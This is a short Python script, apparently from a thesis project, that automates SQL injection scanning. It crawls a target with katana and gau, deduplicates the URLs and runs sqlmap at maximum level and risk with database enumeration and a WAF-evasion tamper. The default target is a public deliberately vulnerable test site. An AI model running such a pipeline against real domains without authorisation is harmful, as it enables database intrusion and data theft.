import subprocess
import os
import logging
import urllib.parse

def setup_logger():
    logger = logging.getLogger('SQLI_Detection')
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    return logger

def run_sqli_scan(target_domain, katana_dir, sqli_dir):
    logger = setup_logger()
    os.makedirs(sqli_dir, exist_ok=True)
    
    # Run katana
    katana_output = os.path.join(katana_dir, "katana_results.txt")
    print(f"Running Katana on {target_domain}")
    katana_command = ["katana", "-u", f"http://{target_domain}", "-output", katana_output]
    subprocess.run(katana_command, check=True)
    
    # Run gau
    gau_output = os.path.join(katana_dir, "gau_results.txt")
    print(f"Running gau on {target_domain}")
    gau_command = ["gau", target_domain, "--o", gau_output]
    subprocess.run(gau_command, check=True)
    
    # Deduplicate URLs
    final_output = os.path.join(sqli_dir, "urls.sqli")
    deduplicate_command = ["uro", "-i", katana_output, "-i", gau_output, "-o", final_output]
    subprocess.run(deduplicate_command, check=True)
    
    # Clean up individual files
    os.remove(katana_output)
    os.remove(gau_output)

    # Run sqlmap
    print("Running sqlmap")
    sqlmap_command = [
        "sqlmap", 
        "-m", final_output, 
        "--level", "5", 
        "--risk", "3", 
        "--batch", 
        "--dbs", 
        "--tamper", "between"
    ]
    subprocess.run(sqlmap_command)
    print("sqlmap scan completed successfully.")

if __name__ == "__main__":
    target_domain = "testphp.vulnweb.com"
    katana_dir = "/mnt/d/MY-thesis01/Hamood-Thesis/results/katana"
    sqli_dir = "/mnt/d/MY-thesis01/Hamood-Thesis/results/sqli"
    run_sqli_scan(target_domain, katana_dir, sqli_dir)
